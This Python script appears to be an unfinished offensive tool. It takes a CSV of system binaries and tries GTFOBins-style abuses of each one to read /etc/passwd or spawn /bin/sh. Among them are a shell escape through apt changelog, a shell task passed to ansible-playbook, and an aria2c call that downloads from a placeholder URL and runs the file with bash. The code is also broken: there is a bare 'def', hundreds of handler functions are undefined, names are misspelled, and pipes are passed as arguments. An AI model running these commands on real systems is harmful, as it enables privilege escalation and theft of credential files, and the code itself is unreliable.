import os
import csv
import subprocess
import argparse

winning_bins = []
op_file = "/etc/passwd"
url = "Choose one for testing"
  
def main():
    #parser = argparse.ArgumentParser(description = "Enter a file you want to process")
    #parser.add_argument("csv", type=str, help = "Argument for file to read")
    #parser.add_argument("ifile", type=str, help = "argument for file to do ops on")
    #parser.add_argument("ofile", type=str, help = "argument for file to output ops")
    #args = parser.parse_args()

    system_bins = fillCsv("lolbin-database.csv")
   
    startLOL(system_bins)

    return 0

def fillCsv(file):
    system_bins = {}

    with open(file, mode = 'r') as csvfile:
        reader = csv.reader(csvfile)

        for bin in reader:
            name = bin[0]
            try:
                result = subprocess.Popen([bin[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                system_bins[name] = True
            except:
                system_bins[name] = False

    return system_bins

#Decision tree for what bin function to call
def startLOL(bins):
    for bin in bins:
        if bins.get(bin):
            if(check_value(bin, op_file)):
                winning_bins.append(bin)

def returnCode(result):
    stdout, stderr = result.communicate()

    if result.returncode != 0:
        #command Pass
        return True
    else:
        #Command fail
        return False

#Bin function
def default(target):
    return f"Unknown bin: {target}"

def sevenZ(target):
    return returnCode(subprocess.Popen(["7z", "a", "-ttar", "-an", "-s ", target, " | ", "7z", "e", "-ttar", "-si", "-so"], stdout=subprocess.PIPE, stderr=subprocess.PIPE))

def aaexec(target):
    return returnCode(subprocess.Popen(["aa-exec", "/bin/sh"]))

def ab(target):
    return True if returnCode(subProcess.Popen(["ab", "-p", target, "127.0.0.1"])) or returnCode(subProcess.Popen(["ab", "-v2", target])) else False

def agetty(target):
    return False

def alpine(target):
    return returnCode(subprocess.Popen(["alpine", "-F", target]))

def ansibleplaybook(target):
    return returnCode(subprocess.Popen([ "echo", "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'", "|", "ansible-playbook"]))

def ansibletest(target):
    return returnCode(subprocess.Popen(["ansible-test", "shell"]))

def aoss(target):
    return returnCode(subprocess.Popen(["aoss", "/bin/sh"]))

def apache2ctl(target):
    return returnCode(subprocess.Popen(["apache2ctl", "-c", "\"Include", target, "\"", "-k", "stop"]))

def aptget(target):
    return returnCode(subprocess.Popen(["apt-get", "changelog", "apt", "&&" , "!/bin/sh"]))

def apt(target):
    return returnCode(subprocess.Popen(["apt", "changelog", "apt", "&&", "!/bin/sh"]))

def ar(target):
    temp = tempfile.TemporaryFile()
    return returnCode(subprocess.Popen(["ar", "r", temp, target]))

def aria2c(target):
    temp = Tempfile.TemporaryFile()
    print("id", temp)
    subprocess.Popen(["chmod", "+x", temp])
    return True if returnCode(subprocess.Popen(["aria2c", "--on-download", temp, "http://x"])) or returnCode(["aria2c", "-o", target, url]) or returnCode(subprocess.Popen(["aria2c", "--allow-overwrite", "--gid=aaaaaaaaaaaaaaaa --on-download-complete=bash", url])) else False

def arj(target):
    # File Read 
    temp = Tempfile.TemporaryFile()
    subprocess.Popen(["arj", "a", "{temp}", "{target}"])
    return returnCode(subprocess.Popen(["arj", "p", temp]))

def arp(target):
    return returnCode(subprocess.Popen(["arp", "-v", "-f", target]))

def a_s(target):
    return returnCode(subprocess.Popen(["as", target]))

def ascii_xfr(target):
    return returnCode(subprocess.Popen(["ascii-xfr", "-ns", target]))

def ascii85(target):
    return returnCode(subprocess.Popen(["ascii85", target, "|", "ascii85", "--decode"]))

def ash(target):
    return returnCode(subprocess.Popen(["ash", "-c", "\'echo", "DATA", ">", target, "\'"]))






def

def check_value(bin, file):
    return {
        "7z": sevenZ,
        "aa_exec": aaexec,
        "ab": ab,
        "agetty": agetty,
        "alpine": alpine,
        "ansible_playbook": ansibleplaybook,
        "ansible_test": ansibletest,
        "aoss": aoss,
        "apache2ctl": apache2ctl,
        "apt_get": aptget,
        "apt": apt,
        "ar": ar,
        "aria2c": aria2c,
        "arj": arj,
        "arp": arp,
        "as": a_s,
        "ascii_xfr": ascii_xfr,
        "ascii85": ascii85,
        "ash": ash,
        "aspell": aspell,
        "at": at,
        "atobm": atobm,
        "awk": awk,
        "aws": aws,
        "base32": base32,
        "base58": base58,
        "base64": base64,
        "basenc": basenc,
        "basez": basez,
        "bash": bash,
        "batcat": batcat,
        "bc": bc,
        "bconsole": bconsole,
        "bpftrace": bpftrace,
        "bridge": bridge,
        "bundle": bundle,
        "bundler": bundler,
        "bustctl": bustctl,
        "busybox": busybox,
        "byebug": byebug,
        "bzip2": bzip2,
        "c89": c89,
        "c99": c99,
        "cabal": cabal,
        "cancel": cancel,
        "capsh": capsh,
        "cat": cat,
        "cdist": cdist,
        "certbot": certbot,
        "check_by_ssh": check_by_ssh,
        "check_cups": check_cups,
        "check_log": check_log,
        "check_memory": check_memory,
        "check_raid": check_raid,
        "check_ssl_cert": check_ssl_cert,
        "check_statusfile": check_statusfile,
        "chmod": chmod,
        "choom": choom,
        "chown": chown,
        "chroot": chroot,
        "clamscan": clamscan,
        "cmp": cmp,
        "cobc": cobc,
        "column": column,
        "comm": comm,
        "composer": composer,
        "cowsay": cowsay,
        "cowthink": cowthink,
        "cp": cp,
        "cpan": cpan,
        "cpio": cpio,
        "cpuliit": cpuliit,
        "crash": crash,
        "crontab": crontab,
        "csh": csh,
        "csplit": csplit,
        "csvtool": csvtool,
        "cupsfilter": cupsfilter,
        "curl": curl,
        "cut": cut,
        "dash": dash,
        "date": date,
        "dc": dc,
        "dd": dd,
        "debugfs": debugfs,
        "dialog": dialog,
        "diff": diff,
        "dig": dig,
        "distcc": distcc,
        "dmesg": dmesg,
        "dmidecode": dmidecode,
        "dmsetup": dmsetup,
        "dnf": dnf,
        "docker": docker,
        "dos2unix": dos2unix,
        "dosbox": dosbox,
        "dotnet": dotnet,
        "dpkg": dpkg,
        "dstat": dstat,
        "dvips": dvips,
        "easy_install": easy_install,
        "eb": eb,
        "ed": ed,
        "efax": efax,
        "elvish": elvish,
        "emacs": emacs,
        "enscript": enscript,
        "env": env,
        "eqn": eqn,
        "espeak": espeak,
        "ex": ex,
        "exiftool": exiftool,
        "expand": expand,
        "expect": expect,
        "facter": facter,
        "file": file,
        "find": find,
        "finger": finger,
        "fish": fish,
        "flock": flock,
        "fmt": fmt,
        "fold": fold,
        "fping": fping,
        "ftp": ftp,
        "gawk": gawk,
        "gcc": gcc,
        "gcloud": gcloud,
        "gcore": gcore,
        "gdb": gdb,
        "gem": gem,
        "genie": genie,
        "genisoimage": genisoimage,
        "ghc": ghc,
        "ghci": ghci,
        "gimp": gimp,
        "ginsh": ginsh,
        "git": git,
        "grc": grc,
        "grep": grep,
        "gtester": gtester,
        "gzip": gzip,
        "hd": hd,
        "head": head,
        "hexdump": hexdump,
        "highlight": highlight,
        "hping3": hping3,
        "iconv": iconv,
        "iftop": iftop,
        "install": install,
        "ionice": ionice,
        "ip": ip,
        "irb": irb,
        "ispell": ispell,
        "jjs": jjs,
        "joe": joe,
        "join": join,
        "journalctl": journalctl,
        "jg": jg,
        "jrunscript": jrunscript,
        "jtag": jtag,
        "julia": julia,
        "knife": knife,
        "ksh": ksh,
        "ksshell": ksshell,
        "ksu": ksu,
        "kubectl": kubectl,
        "latex": latex,
        "latexmk": latexmk,
        "ld.so": ld_so,
        "ldconfig": ldconfig,
        "less": less,
        "lftp": lftp,
        "links": links,
        "ln": ln,
        "loginctl": loginctl,
        "logsave": logsave,
        "look": look,
        "lp": lp,
        "ltrace": ltrace,
        "lua": lua,
        "lualatex": lualatex,
        "luatex": luatex,
        "lwp_download": lwp_download,
        "lwp_request": lwp_request,
        "mail": mail,
        "make": make,
        "man": man,
        "mawk": mawk,
        "minicom": minicom,
        "more": more,
        "mosquitto": mosquitto,
        "mount": mount,
        "msfconsole": msfconsole,
        "msgattrib": msgattrib,
        "msgcat": msgcat,
        "msgconv": msgconv,
        "msgfilter": msgfilter,
        "msgmerge": msgmerge,
        "msguniq": msguniq,
        "mtr": mtr,
        "multitime": multitime,
        "mv": mv,
        "mysql": mysql,
        "nano": nano,
        "nasm": nasm,
        "nawk": nawk,
        "nc": nc,
        "ncdu": ncdu,
        "ncftp": ncftp,
        "neofetch": neofetch,
        "nft": nft,
        "nice": nice,
        "nl": nl,
        "nm": nm,
        "nmap": nmap,
        "node": node,
        "nohup": nohup,
        "npm": npm,
        "nroff": nroff,
        "nsenter": nsenter,
        "ntpdate": ntpdate,
        "octave": octave,
        "od": od,
        "openssl": openssl,
        "openvpn": openvpn,
        "openvt": openvt,
        "opkg": opkg,
        "pandoc": pandoc,
        "paste": paste,
        "pax": pax,
        "pdb": pdb,
        "pdflatex": pdflatex,
        "pdftex": pdftex,
        "perf": perf,
        "perl": perl,
        "perlbug": perlbug,
        "pexec": pexec,
        "pg": pg,
        "php": php,
        "pic": pic,
        "pico": pico,
        "pidstat": pidstat,
        "pip": pip,
        "pkexec": pkexec,
        "pkg": pkg,
        "posh": posh,
        "pr": pr,
        "pry": pry,
        "psftp": psftp,
        "psql": psql,
        "ptx": ptx,
        "puppet": puppet,
        "pwsh": pwsh,
        "python": python,
        "rake": rake,
        "rc": rc,
        "readelf": readelf,
        "red": red,
        "redcarpet": redcarpet,
        "redis": redis,
        "restic": restic,
        "rev": rev,
        "relogin": relogin,
        "rlwrap": rlwrap,
        "rpm": rpm,
        "rpmdb": rpmdb,
        "rpmquery": rpmquery,
        "rpmverify": rpmverify,
        "rsync": rsync,
        "rtorrent": rtorrent,
        "ruby": ruby,
        "run_mailcap": run_mailcap,
        "run_parts": run_parts,
        "runscript": runscript,
        "rview": rview,
        "rvim": rvim,
        "sash": sash,
        "scanmem": scanmem,
        "scp": scp,
        "screen": screen,
        "script": script,
        "scrot": scrot,
        "sed": sed,
        "service": service,
        "setarch": setarch,
        "setfacl": setfacl,
        "setlock": setlock,
        "sftp": sftp,
        "sg": sg,
        "shuf": shuf,
        "slsh": slsh,
        "smbclient": smbclient,
        "snap": snap,
        "socat": socat,
        "socket": socket,
        "soelim": soelim,
        "softlimit": softlimit,
        "sort": sort,
        "split": split,
        "sqlite3": sqlite3,
        "sqlmap": sqlmap,
        "ss": ss,
        "ssh_agent": ssh_agent,
        "ssh_keygen": ssh_keygen,
        "ssh_keyscan": ssh_keyscan,
        "ssh": ssh,
        "sshpas": sshpas,
        "start_stop_daemon": start_stop_daemon,
        "stdbuf": stdbuf,
        "strace": strace,
        "strings": strings,
        "su": su,
        "sudo": sudo,
        "sysctl": sysctl,
        "systemctl": systemctl,
        "systemd-resolve": systemd_resolve,
        "tac": tac,
        "tail": tail,
        "tar": tar,
        "task": task,
        "tasket": tasket,
        "tasksh": tasksh,
        "tbl": tbl,
        "tclsh": tclsh,
        "tcpdump": tcpdump,
        "tdbtool": tdbtool,
        "tee": tee,
        "telnet": telnet,
        "terraform": terraform,
        "tex": tex,
        "tftp": tftp,
        "tic": tic,
        "time": time,
        "timedatectl": timedatectl,
        "timeout": timeout,
        "tmate": tmate,
        "tmux": tmux,
        "top": top,
        "torify": torify,
        "torsocks": torsocks,
        "troff": troff,
        "tshark": tshark,
        "ul": ul,
        "unexpand": unexpand,
        "uniq": uniq,
        "unshare": unshare,
        "unsquashfs": unsquashfs,
        "unzip": unzip,
        "update-alternatives": update_alternatives,
        "uudecode": uudecode,
        "uuencode": uuencode,
        "vagrant": vagrant,
        "valgrind": valgrind,
        "varnishncsa": varnishncsa,
        "vi": vi,
        "view": view,
        "vigr": vigr,
        "vim": vim,
        "vimdiff": vimdiff,
        "vipw": vipw,
        "virsh": virsh,
        "volatility": volatility,
        "w3m": w3m,
        "wall": wall,
        "watch": watch,
        "wc": wc,
        "wget": wget,
        "whiptail": whiptail,
        "whois": whois,
        "wireshark": wireshark,
        "wish": wish,
        "xargs": xargs,
        "xdg-user-dir": xdg_user_dir,
        "xdotool": xdotool,
        "xelatex": xelatex,
        "xetex": xetex,
        "xmodmap": xmodmap,
        "xmore": xmore,
        "xpad": xpad,
        "xxd": xxd,
        "xz": xz,
        "yarn": yarn,
        "yash": yash,
        "yelp": yelp,
        "yum": yum,
        "zathura": zathura,
        "zip": zip,
        "zsh": zsh,
        "zsoelim": zsoelim,
        "zypper": zypper
    }.get(bin, default)(file)

if __name__ == "__main__":
    main()
